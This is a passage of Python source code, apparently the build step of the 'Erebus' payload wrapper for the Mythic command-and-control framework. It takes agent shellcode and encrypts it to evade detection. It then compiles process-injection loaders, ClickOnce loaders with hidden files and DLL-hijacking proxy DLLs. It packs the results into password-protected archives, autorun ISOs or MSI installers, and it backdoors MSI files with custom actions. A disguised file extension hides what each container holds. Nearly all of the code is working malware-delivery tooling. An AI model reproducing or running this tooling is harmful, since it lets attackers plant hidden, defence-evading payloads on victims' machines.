            shutil.copy2(backdoored_msi_path, final_msi_path)

            # Build success message with attack details
            success_msg = f"Successfully backdoored MSI: {final_msi_path.name}\n"
            success_msg += f"Attack Type: {attack_type}\n"
            success_msg += f"Custom Action: {custom_action_name}\n"
            if entry_point:
                success_msg += f"Entry Point: {entry_point}\n"
            if command_args:
                success_msg += f"Arguments: {command_args}\n"
            success_msg += f"Condition: {condition}"

            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Backdooring MSI",
                StepStdout=success_msg,
            ))

        except Exception as e:
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Backdooring MSI",
                StepStdout=f"Failed to backdoor MSI: {str(e)}",
                StepSuccess=False,
            ))
            raise RuntimeError(f"MSI backdooring failed: {str(e)}")

    async def containerise_payload(self,agent_build_path):
        """Creates a container and adds all files generated from the payload function inside of the given archive/media"""


        ext_source = self.get_parameter("0.8 Output Extension Source")
        if ext_source == "MalDoc":
            maldoc_mode = self.get_parameter("0.9 Create MalDoc")
            if maldoc_mode == "VBA Module Only":
                target_ext = ".bas"
            else:
                target_ext = ".xlsm"
        else:
            target_ext = f".{self.get_parameter('0.9 Trigger Type').lower()}"


        match(self.get_parameter("3.0 Container Type")):
            case "7z":
                  return build_7z(
                    compression=self.get_parameter("3.1 Compression Level"),
                    password=self.get_parameter("3.2 Archive Password"),
                    build_path=Path(agent_build_path),
                    visible_extension=target_ext
                )

            case "Zip":
                return build_zip(
                    compression=self.get_parameter("3.1 Compression Level"),
                    password=self.get_parameter("3.2 Archive Password"),
                    build_path=Path(agent_build_path),
                    visible_extension=target_ext
                )

            case "ISO":
                source_iso_path = None
                iso_uuid = self.get_parameter("4.2 ISO Backdoor File")
                if iso_uuid:
                    file_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=iso_uuid)
                    )
                    if file_resp.Success:
                        filename = f"template_{iso_uuid}.iso"
                        temp_dir = Path(tempfile.gettempdir())
                        source_iso_path = temp_dir / filename
                        source_iso_path.write_bytes(file_resp.Content)
                return build_iso(
                                    volume_id=self.get_parameter("4.0 ISO Volume ID"),
                                    enable_autorun = self.get_parameter("4.1 ISO enable Autorun"),
                                    source_iso=source_iso_path,
                                    build_path=Path(agent_build_path),
                                    visible_extension=target_ext
                                )

            case "MSI":
                return build_msi(
                    build_path=Path(agent_build_path),
                    app_name=self.get_parameter("5.0 MSI Product Name"),
                    manufacturer=self.get_parameter("5.1 MSI Manufacturer"),
                    install_scope=self.get_parameter("5.2 MSI Install Scope")
                )

        return None

    async def build(self) -> BuildResponse:
        response = BuildResponse(status = BuildStatus.Error)
        output = ""

        try:
            #Run plugin validation only once at startup
            if not ErebusWrapper._validation_run:
                ErebusWrapper._validation_run = True
                run_plugin_validation()
                try:
                    await report_validation_results(operation_id=getattr(self, "operation_id", None))
                except Exception as e:
                    print(f"[!] Could not report plugin status: {e}")

            agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid).name
            copy_tree(str(self.agent_code_path), agent_build_path)

            mythic_shellcode_path = PurePath(agent_build_path) / "shellcode" / "payload.bin"
            mythic_shellcode_path = str(mythic_shellcode_path)

            hijack_dir = PurePath(agent_build_path) / "hijack"
            hijack_dir_str = str(hijack_dir)

            obfuscated_shellcode_path = PurePath(agent_build_path) / "shellcode" / "obfuscated.bin"
            obfuscated_shellcode_path = str(obfuscated_shellcode_path)

            shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
            clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
            encrypted_shellcode_path_sc = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
            encrypted_shellcode_path_dll = PurePath(agent_build_path) / "hijack" / "shellcode.hpp"

            shellcode_loader_path = str(shellcode_loader_path)
            clickonce_loader_path = str(clickonce_loader_path)
            encrypted_shellcode_path_sc = str(encrypted_shellcode_path_sc)
            encrypted_shellcode_path_dll = str(encrypted_shellcode_path_dll)

            shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
            shellcrypt_path = str(shellcrypt_path)

            templates_path = PurePath(agent_build_path) / "templates"
            dll_exports_path = templates_path / "proxy.def"

            dll_target_path = templates_path / "dll_target.dll"

            templates_path = str(templates_path)
            dll_exports_path = str(dll_exports_path)

            # Create payload directory if it doesn't exist
            payload_dir = Path(agent_build_path) / "payload"
            payload_dir.mkdir(parents=True, exist_ok=True)

            environment = Environment(loader=FileSystemLoader(templates_path))

            # Validate wrapped_payload before writing
            if self.wrapped_payload is None:
                response.status = BuildStatus.Error
                response.build_stderr = "No wrapped payload provided. The wrapped_payload is None."
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Gathering Files",
                    StepStdout="No wrapped payload provided (wrapped_payload is None).",
                    StepSuccess=False
                ))
                return response

            with open(mythic_shellcode_path, "wb") as file:
                file.write(self.wrapped_payload)

            if os.stat(mythic_shellcode_path) == 0:
                response.status = BuildStatus.Error
                response.build_stderr = "Failed to write Mythic Shellcode to placeholder file."
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Gathering Files",
                        StepStdout="Failed to write Mythic Shellcode to placeholder file.",
                        StepSuccess=False
                    ))
                return response

            response.status = BuildStatus.Success
            response.build_message = "Files Gathered for Modification."
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName = "Gathering Files",
                StepStdout = "Gathered files to obfuscate shellcode",
                StepSuccess = True
            ))

            ######################### Shellcode Obfuscation Section #########################
            # Defaults for config template rendering (may be updated after shellcrypt output)
            encryption_type_map = {
                "NONE": 0,
                "XOR": 1,
                "RC4": 2,
                "AES_ECB": 3,
                "AES_CBC": 4,
            }
            encryption_type_value = encryption_type_map.get(self.get_parameter("2.1 Encryption Type"), 0)
            encryption_key_bytes = "0x00"
            encryption_iv_bytes = ", ".join(["0x00"] * 16)
            with open(str(mythic_shellcode_path), "rb") as f:
                header = f.read(2)
                if header == b"\x4d\x5a":
                    response.status = BuildStatus.Error
                    response.build_stderr = "Supplied payload is a PE instead of raw shellcode."
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Header Check",
                        StepStdout="Found leading MZ header - supplied file was not shellcode",
                        StepSuccess=False
                    ))
                    return response
            response.status = BuildStatus.Success
            response.build_message = "No leading MZ header found in payload."
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Header Check",
                StepStdout="No leading MZ header found in payload",
                StepSuccess=True
            ))

            cmd = [
                "python",
                shellcrypt_path,
                "-i", mythic_shellcode_path,
                "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                # "-f", SHELLCODE_FORMAT[self.get_parameter("2.4 Shellcode Format")],
            ]

            if self.get_parameter("0.0 Main Payload Type") == "Hijack":
                cmd += ["-f", "csharp"]

            match self.get_parameter("0.1 Loader Type"):
                case "ClickOnce":
                    cmd += ["-f", "csharp"]
                case "Shellcode Loader":
                    cmd += ["-f", "c"]
                case _:
                    cmd += ["-f", "c"]

            if self.get_parameter("2.4 Shellcode Format") != "Raw":
                cmd += ["-a", "shellcode"]

            if self.get_parameter("2.0 Compression Type") != "NONE":
                cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]

            if self.get_parameter("2.3 Encoding Type") != "NONE":
                cmd += ["-d", ENCODING_METHODS[self.get_parameter("2.3 Encoding Type")]]

            if self.get_parameter("2.2 Encryption Key") != "NONE":
                cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

            cmd += ["-o", obfuscated_shellcode_path]

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await process.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"

            if os.path.exists(obfuscated_shellcode_path):
                # Always get shellcrypt output in C format to extract key/IV for config template
                try:
                    import re
                    key_cmd = [
                        "python",
                        shellcrypt_path,
                        "-i", mythic_shellcode_path,
                        "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                        "-f", "c",
                        "-a", "shellcode",
                    ]

                    if self.get_parameter("2.2 Encryption Key") != "NONE":
                        key_cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

                    if self.get_parameter("2.0 Compression Type") != "NONE":
                        key_cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]

                    if self.get_parameter("2.3 Encoding Type") != "NONE":
                        key_cmd += ["-d", ENCODING_METHODS[self.get_parameter("2.3 Encoding Type")]]

                    shellcode_src = subprocess.check_output(key_cmd, text=True)

                    key_match = re.search(r"unsigned char\s+key\[\]\s*=\s*\{([^}]+)\}", shellcode_src)
                    if key_match:
                        encryption_key_bytes = ", ".join(x.strip() for x in key_match.group(1).split(",") if x.strip())

                    iv_match = re.search(r"unsigned char\s+iv\[\]\s*=\s*\{([^}]+)\}", shellcode_src)
                    if iv_match:
                        encryption_iv_bytes = ", ".join(x.strip() for x in iv_match.group(1).split(",") if x.strip())
                except Exception as e:
                    output += f"[WARN] Failed to parse shellcrypt key/IV: {str(e)}\n"

                # Copy the obfuscated shellcode file over to the shellcode.hpp file
                if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_sc))
                elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
                    # For CSharp format, copy to encrypted_shellcode_path_sc which will be read later
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_sc))
                    output += f"[DEBUG] Copied CSharp shellcode to {encrypted_shellcode_path_sc}\n"
                elif self.get_parameter("0.0 Main Payload Type") == "Hijack":
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_dll))

                if self.get_parameter("2.4 Shellcode Format") == "Raw":
                    # Get the encryption key in C format to be used within the loader and other functions
                    cmd = [
                        "python",
                        shellcrypt_path,
                        "-i", mythic_shellcode_path,
                        "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                        "-f",
                        "c",
                        "-a",
                        "shellcode"
                    ]

                    if self.get_parameter("2.2 Encryption Key") != "NONE":
                        cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

                    shellcode_src = subprocess.check_output(cmd, text=True)
                    output += shellcode_src

                    # Write key to file
                    start = shellcode_src.find("unsigned char key")
                    end   = shellcode_src.find("};", start) + 2
                    key_array = shellcode_src[start:end]
                    output += key_array
                    with open(encrypted_shellcode_path_sc, "w") as file:
                        file.write(key_array)

                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    response.build_stdout = output + "\n" + obfuscated_shellcode_path
                    response.updated_filename = "erebus_wrapper.bin"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Shellcode Obfuscation",
                        StepStdout="Obfuscated Shellcode - Continuing to Next Step",
                        StepSuccess=True,
                    ))
                else:
                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Shellcode Obfuscation",
                        StepStdout="Obfuscated Shellcode - Continuing to Next Step",
                        StepSuccess=True,
                    ))

            elif proc.returncode != 0:
                response.payload = b""
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response

            else:
                response.payload = b""
                response.status = BuildStatus.Error
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response
            output = ""
            ######################### End of Shellcode Obfuscation Section #########################

            ######################### DLL Hijacking Section #########################
            if self.get_parameter("0.0 Main Payload Type") == "Hijack":
                print(f'User Selected: {self.get_parameter("0.0 Main Payload Type")}')

                # Get the DLL target's file content & information
                file_content = await getFileFromMythic(
                    agentFileId=self.get_parameter("1.0 DLL Hijacking")
                )

                file_name_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    AgentFileID=self.get_parameter("1.0 DLL Hijacking")
                ))

                dll_file_name = ""
                if file_name_resp.Success:
                    if len(file_name_resp.Files) > 0:
                        dll_file_name = file_name_resp.Files[0].Filename

                with open(dll_target_path, "wb") as file:
                    file.write(file_content)

                payload_path = PurePath(agent_build_path) / "payload" / dll_file_name
                payload_path = str(payload_path)

                exports = await generate_proxies(dll_file=dll_target_path, dll_file_name=dll_file_name)

                # Debug logging
                output += f"[DEBUG] Generated exports ({len(exports) if exports else 0} chars):\n{exports[:500] if exports else 'None'}\n"

                exports_list = {
                    "EXPORTS": exports
                }

                proxy_template = environment.get_template("proxy.def")
                proxy_output = proxy_template.render(**exports_list)

                with open(dll_exports_path, "w") as file:
                    file.write(proxy_output)

                # Validate that proxy.def was generated with actual exports
                # The file should contain "EXPORTS" header (8 bytes) plus at least one export line
                if not exports or len(exports.strip()) == 0 or os.stat(dll_exports_path).st_size <= 20:
                    response.status = BuildStatus.Error
                    response.build_message = f"Failed to proxy the given file. No exports found or file too small ({os.stat(dll_exports_path).st_size} bytes)."
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Gathering DLL Exports for Hijacking",
                        StepStdout=f"Failed to proxy the given file. Generated proxy.def is {os.stat(dll_exports_path).st_size} bytes.",
                        StepSuccess=False,
                    ))
                    return response
                else:
                    response.status = BuildStatus.Success
                    response.build_message = "DLL Proxied! Compiling Payload..."
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Gathering DLL Exports for Hijacking",
                        StepStdout="DLL Proxied! Compiling Payload...",
                        StepSuccess=True,
                    ))

                # Load and render the config template
                config_template = environment.get_template("config.hpp")
                config_data = {
                    "TARGET_PROCESS": self.get_parameter("0.5 Shellcode Loader - Target Process"),
                    "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
                    "ENCRYPTION_TYPE": encryption_type_value,
                    "ENCRYPTION_KEY": encryption_key_bytes,
                    "ENCRYPTION_IV": encryption_iv_bytes,
                }
                rendered_config = config_template.render(**config_data)

                config_hpp_destination = PurePath(hijack_dir) / "config.hpp"
                config_hpp_destination = str(config_hpp_destination)

                # Write the rendered config to the destination
                with open(config_hpp_destination, "w", encoding="utf-8") as config_file:
                    config_file.write(rendered_config)

                # Use make to compile the DLL with all hijack directory files
                cmd = [
                    "make",
                    "-C",
                    hijack_dir_str,
                    f"OUTPUT_PATH={PurePath(agent_build_path) / 'payload'}",
                    f"DLL_NAME={dll_file_name}",
                    f"TEMPLATE_PATH={templates_path}",
                ]

                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

                stdout, stderr = await process.communicate()

                if stdout:
                    output += f"[stdout]\n{stdout.decode()}"
                if stderr:
                    output += f"[stderr]\n{stderr.decode()}"

                if os.path.exists(payload_path):
                    # response.payload = open(payload_path, "rb").read()
                    response.status = BuildStatus.Success
                    response.build_message = "DLL Compiled!"
                    response.build_stdout = output + "\n" + payload_path
                    # response.updated_filename = dll_file_name
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compiling DLL Payload",
                        StepStdout="DLL Loader Compiled!",
                        StepSuccess=True,
                    ))
                    # Debug
                    # return response
                else:
                    response.status = BuildStatus.Error
                    response.payload = b""
                    response.build_message = "Failed to compile DLL"
                    response.build_stderr = output + "\n" + payload_path
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compiling DLL Payload",
                        StepStdout="Failed to Compile DLL Payload",
                        StepSuccess=False,
                    ))
                    return response
                output = ""
            ######################### End Of DLL Hijacking Section #########################

            ######################### Shellcode Loader Section #########################
            if self.get_parameter("0.0 Main Payload Type") == "Loader":
                print(f'User Selected: {self.get_parameter("0.0 Main Payload Type")}')
                # Logic : Select between shellcode loader and clickonce loader
                if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
                    shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin",
                                src=obfuscated_shellcode_path)

                    payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
                    payload_path = str(payload_path)

                    # ===== Configure Shellcode Loader config.hpp =====
                    config_hpp_template_path = PurePath(agent_build_path) / "templates" / "config.hpp"
                    config_hpp_template_path = str(config_hpp_template_path)
                    config_hpp_destination = PurePath(shellcode_loader_path) / "include" / "config.hpp"
                    config_hpp_destination = str(config_hpp_destination)

                    try:
                        # Load and render the config template
                        config_template = environment.get_template("config.hpp")
                        config_data = {
                            "TARGET_PROCESS": self.get_parameter("0.5 Shellcode Loader - Target Process"),
                            "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
                            "ENCRYPTION_TYPE": encryption_type_value,
                            "ENCRYPTION_KEY": encryption_key_bytes,
                            "ENCRYPTION_IV": encryption_iv_bytes,
                        }
                        rendered_config = config_template.render(**config_data)

                        # Write the rendered config to the destination
                        with open(config_hpp_destination, "w") as config_file:
                            config_file.write(rendered_config)

                        response.status = BuildStatus.Success
                        response.build_message = "Shellcode Loader config generated!"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Configuring Shellcode Loader",
                            StepStdout="Generated config.hpp with user-defined injection parameters",
                            StepSuccess=True,
                        ))
                    except Exception as e:
                        response.status = BuildStatus.Error
                        response.build_stderr = f"Failed to render Shellcode Loader config: {str(e)}"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Configuring Shellcode Loader",
                            StepStdout=f"Failed to render config.hpp: {str(e)}",
                            StepSuccess=False,
                        ))
                        return response

                    # Convert resource file to UTF16
                    cmd = [
                        "iconv",
                        "-f",
                        "UTF-16LE",
                        "-t",
                        "UTF-8",
                        f"{shellcode_loader_path}/Erebus.Loader.rc",
                    ]

                    resource_file = subprocess.check_output(cmd, text=True)
                    with open(f"{shellcode_loader_path}/Erebus.Loader.utf8.rc", "w") as file:
                        file.write(resource_file)

                    cmd = [
                        "mv",
                        f"{shellcode_loader_path}/Erebus.Loader.utf8.rc",
                        f"{shellcode_loader_path}/Erebus.Loader.rc",
                    ]
                    process = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await process.communicate()

                    if stdout:
                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
                    if stderr:
                        output += f"[stderr]\n{stderr.decode(errors='replace')}"

                    # Compile Loader
                    cmd = [
                        "make",
                        "-C",
                        shellcode_loader_path,
                        f"BUILD={self.get_parameter('0.3 Loader Build Configuration')}",
                        "all"
                    ]
                    process = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await process.communicate()

                    if stdout:
                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
                    if stderr:
                        output += f"[stderr]\n{stderr.decode(errors='replace')}"

                    shutil.copy(dst=payload_path, src=f"{shellcode_loader_path}/erebus.exe")

                    if os.path.exists(payload_path):
                        # Debug
                        # response.payload = open(payload_path, "rb").read()
                        # response.updated_filename = "erebus_loader.exe"
                        response.status = BuildStatus.Success
                        response.build_message = "Loader Compiled!"
                        response.build_stdout = output + "\n" + payload_path
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Compiling Shellcode Loader",
                            StepStdout="Shellcode Loader Compiled!",
                            StepSuccess=True,
                        ))

                        # return response
                    else:
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to compile loader"
                        response.build_stderr = output + "\n" + payload_path
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Compiling Shellcode Loader",
                            StepStdout="Failed to Compile Shellcode Loader",
                            StepSuccess=False,
                        ))
                        return response
                    output = ""
                elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
                    payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
                    payload_path = str(payload_path)

                    # ===== Configure ClickOnce InjectionConfig.cs =====
                    injection_config_template_path = PurePath(agent_build_path) / "templates" / "InjectionConfig.cs"
                    injection_config_template_path = str(injection_config_template_path)
                    injection_config_destination = PurePath(clickonce_loader_path) / "InjectionConfig.cs"
                    injection_config_destination = str(injection_config_destination)

                    try:
                        encryption_key_bytes = ""
                        encrypted_shellcode_bytes = ""
                        if os.path.exists(encrypted_shellcode_path_sc):
                            try:
                                with open(encrypted_shellcode_path_sc, "r") as combined_file:
                                    combined_content = combined_file.read()
                                    output += f"[DEBUG] File read from: {encrypted_shellcode_path_sc}\n"
                                    output += f"[DEBUG] File size: {len(combined_content)} bytes\n"
                                    output += f"[DEBUG] First 500 chars: {combined_content[:500]}\n"
                                    import re

                                    # Extract key array bytes - handles both C++ and C# formats
                                    # Matches: key[2] = { ... } or byte[] key[2] = { ... }
                                    key_match = re.search(r'(?:byte\[\]\s+)?key\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
                                    if key_match:
                                        key_section = key_match.group(1)
                                        hex_key = re.findall(r'0x[0-9a-fA-F]{2}', key_section)
                                        if hex_key:
                                            encryption_key_bytes = ", ".join(hex_key)
                                            output += f"[DEBUG] Extracted encryption key bytes: {encryption_key_bytes}\n"
                                        else:
                                            output += f"[DEBUG] No hex values found in key section: {key_section[:100]}\n"
                                    else:
                                        output += "[DEBUG] Key array not found in file\n"

                                    # Extract shellcode array bytes - handles both C++ and C# formats
                                    # Matches: shellcode[113] = { ... } or sh3llc0d3[113] = { ... } or byte[] shellcode[113] = { ... }
                                    shellcode_match = re.search(r'(?:byte\[\]\s+)?(?:sh3llc0d3|shellcode)\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
                                    if shellcode_match:
                                        shellcode_section = shellcode_match.group(1)
                                        hex_shellcode = re.findall(r'0x[0-9a-fA-F]{2}', shellcode_section)
                                        if hex_shellcode:
                                            encrypted_shellcode_bytes = ", ".join(hex_shellcode)
                                            output += f"[DEBUG] Extracted shellcode bytes (count: {len(hex_shellcode)})\n"
                                        else:
                                            output += f"[DEBUG] No hex values found in shellcode section: {shellcode_section[:100]}\n"
                                    else:
                                        output += "[DEBUG] Shellcode array not found in file\n"

                            except Exception as extract_error:
                                output += f"Warning: Could not extract encryption key or shellcode: {str(extract_error)}\n"
                        else:
                            output += f"[DEBUG] File does not exist: {encrypted_shellcode_path_sc}\n"

                        injection_config_template = environment.get_template("InjectionConfig.cs")
                        injection_config_data = {
                            "INJECTION_METHOD": self.get_parameter("0.6 ClickOnce - Injection Method"),
                            "TARGET_PROCESS": self.get_parameter("0.7 ClickOnce - Target Process"),
                            "ENCRYPTION_KEY": encryption_key_bytes,
                            "ENCRYPTION_SHELLCODE": encrypted_shellcode_bytes
                        }
                        rendered_injection_config = injection_config_template.render(**injection_config_data)

                        with open(injection_config_destination, "w") as config_file:
                            config_file.write(rendered_injection_config)

                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce config generated!"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Configuring ClickOnce Loader",
                            StepStdout="Generated InjectionConfig.cs with user-defined injection parameters",
                            StepSuccess=True,
                        ))
                    except Exception as e:
                        response.status = BuildStatus.Error
                        response.build_stderr = f"Failed to render ClickOnce config: {str(e)}"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Configuring ClickOnce Loader",
                            StepStdout=f"Failed to render InjectionConfig.cs: {str(e)}",
                            StepSuccess=False,
                        ))
                        return response

                    # Compile ClickOnce Loader using Makefile
                    # Makefile target "publish" automatically handles build, cleanup, and verification
                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
                    rid = self.get_parameter('0.4 ClickOnce RID') or "win-x64"

                    cmd = [
                        "make",
                        "-C",
                        clickonce_loader_path,
                        f"CONFIG={build_config}",
                        f"RID={rid}",
                        "publish"
                    ]

                    process = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await process.communicate()

                    if stdout:
                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
                    if stderr:
                        output += f"[stderr]\n{stderr.decode(errors='replace')}"

                    if process.returncode != 0:
                        response.status = BuildStatus.Error
                        response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
                        response.build_stderr = output
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Compiling ClickOnce Loader",
                            StepStdout=f"Makefile publish failed",
                            StepSuccess=False,
                        ))
                        return response

                    # Locate publish output: bin/{config}/{tfm}/{rid}/publish
                    # Makefile ensures cleanup happens, so all remaining files are needed
                    publish_root = Path(clickonce_loader_path) / "bin" / build_config

                    publish_dir = None
                    if publish_root.exists():
                        # Traverse: CONFIG/TFM/RID/publish
                        for tfm_dir in publish_root.iterdir():
                            if tfm_dir.is_dir() and "net" in tfm_dir.name and "-windows" in tfm_dir.name:
                                # Found TFM directory (e.g., net7.0-windows)
                                for rid_dir in tfm_dir.iterdir():
                                    if rid_dir.is_dir():
                                        candidate = rid_dir / "publish"
                                        if candidate.exists():
                                            publish_dir = candidate
                                            break
                                if publish_dir:
                                    break

                    if not publish_dir or not publish_dir.exists():
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to locate ClickOnce publish output directory"
                        response.build_stderr = output + f"\nSearched in: {publish_root}"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Compiling ClickOnce Loader",
                            StepStdout="Failed to locate ClickOnce publish output",
                            StepSuccess=False,
                        ))
                        return response

                    # Copy cleaned artifacts from publish directory to payload directory
                    # Makefile cleanup removes debug symbols and unnecessary runtime files
                    payload_dir = Path(agent_build_path) / "payload"
                    payload_dir.mkdir(parents=True, exist_ok=True)

                    # Copy all files from publish directory (already cleaned by Makefile)
                    for item in publish_dir.iterdir():
                        if item.is_file():
                            dest_path = payload_dir / item.name
                            shutil.copy2(str(item), str(dest_path))
                            # Try to hide files on Windows
                            try:
                                import ctypes
                                FILE_ATTRIBUTE_HIDDEN = 0x02
                                ctypes.windll.kernel32.SetFileAttributesW(str(dest_path), FILE_ATTRIBUTE_HIDDEN)
                            except:
                                pass

                    # Log available files after cleanup
                    output += f"[DEBUG] Cleaned publish artifacts:\n"
                    for item in publish_dir.iterdir():
                        if item.is_file():
                            output += f"  - {item.name} ({item.stat().st_size} bytes)\n"

                    # Locate main executable (Makefile ensures it exists)
                    clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
                    clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"

                    if clickonce_exe.exists():
                        # Copy exe as primary payload
                        shutil.copy2(str(clickonce_exe), str(payload_path))
                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path}"
                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce Loader compiled successfully!"
                    elif clickonce_dll.exists():
                        # Fallback to DLL if exe not present
                        payload_path_dll = Path(payload_path).with_suffix(".dll")
                        shutil.copy2(str(clickonce_dll), str(payload_path_dll))
                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path_dll}"
                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce Loader compiled successfully!"
                    else:
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to locate compiled ClickOnce executable"
                        response.build_stderr = output + "\nNo .exe or .dll found in publish directory"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Compiling ClickOnce Loader",
